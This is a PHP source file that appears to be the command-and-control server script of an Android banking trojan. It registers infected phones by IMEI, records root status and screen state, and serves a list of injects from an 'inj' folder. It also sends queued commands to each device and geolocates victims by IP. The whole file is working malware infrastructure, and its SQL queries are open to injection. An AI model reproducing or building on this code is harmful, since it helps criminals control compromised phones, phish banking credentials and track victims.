<?php
include 'crypt.php';
include 'db.php';
include 'admin/func.php';

$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
$request = mb_substr($request, 0, mb_strlen($request));
$request = decrypt($request,cryptKey);

$massivReq = explode(":", $request);


$IMEI = $massivReq[0];
$root = $massivReq[1];
$screen = $massivReq[2];

# $root = "get_injects";

# $screen = mb_substr($screen,0,mb_strlen($screen)-1);

$mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);

$sql = "SELECT * FROM kliets WHERE IMEI='$IMEI'";

$booleanIMEI = false;
$client_ip_prev = '';
foreach($mysqli->query($sql) as $row){
	if($row['IMEI']==$IMEI)	{
		$booleanIMEI=true;	
		$client_ip_prev=$row['IP'];
		break;
	}
}
if ($root == 'get_injects'){
	$inj_list = "";
	$files = scandir('inj');
	foreach ($files as $file) {
		if (($file != ".") and ($file != "..") and ($file != "") and ($file != "go.php") and ($file != ".htaccess")){
			$inj_list .= "$file\n";
		}
	}
	$tag = "<tag>";
	$otv = encrypt("$inj_list",cryptKey);
	$tagend = "</tag>";
	echo "$tag$otv$tagend";
	return;
}
if ($root == 'Admin'){
	$update_perm_sql = "UPDATE kliets SET r00t= '$root' WHERE IMEI='$IMEI'";
	$mysqli->query($update_sql);
	return;
}

$internet = $massivReq[3];

if($booleanIMEI == true){
	 $sql2 = "SELECT * FROM commands";
	 $data_comm = "";
	 foreach($mysqli->query($sql2) as $row){
		 if($row['IMEI']==$IMEI){ 
	         $com0 = "id=";
			 $com1 = $row['id'];
			 $com2 = $row['command'];
			 $data_comm = "$data_comm$com0$com1$com2";
		}
	 }

	 $sql3 = "DELETE FROM commands WHERE IMEI='$IMEI'";
	 $mysqli->query($sql3);

	 $zip = '';
	 $regionName = '';
	 $city = '';
	 $data_ = date('Y-m-d H:i'); 
	 $client_ip = $_SERVER['REMOTE_ADDR'];
	 $update_sql = '';

	 # FIXME: hack for catch client ip
	 $update_sql = "UPDATE kliets SET lastConnect = '$data_', version_apk = '$root', screen= '$screen', internet= '$internet', IP= '$client_ip' WHERE IMEI='$IMEI';";
	 $mysqli->query($update_sql);

	 if (($client_ip_prev != $client_ip) or ($client_ip_prev == '')){
	 	$json = file_get_contents("http://ip-api.com/json/$client_ip");
	 	$location_obj = json_decode($json);
	 	if($location_obj->status == "success"){
			$zip = $location_obj->zip;
			$regionName = $location_obj->regionName;
			$city = $location_obj->city;

			$update_sql = "UPDATE kliets SET lastConnect = '$data_', version_apk = '$root', screen= '$screen', internet= '$internet', IP= '$client_ip', zip= '$zip', regionName='$regionName', city= '$city' WHERE IMEI='$IMEI';";
			$mysqli->query($update_sql);
		}
	 }
	 $booleanIMEI == false;

	 # send dedicaded event to jabber clients
	 if (check_imei_event($IMEI, $mysqli)){
	 	send_jabber_event('dedicated_event', $IMEI.":lastConnect ".$data_, $mysqli);
	 }

	$tag = "<tag>";
	$otv = encrypt("$data_comm",cryptKey);
	$tagend = "</tag>";
	echo "$tag$otv$tagend";
}else{
	$tag = "<tag>";
	$otv = encrypt("|NO|",cryptKey);
	$tagend = "</tag>";
	echo "$tag$otv$tagend";
}

?>
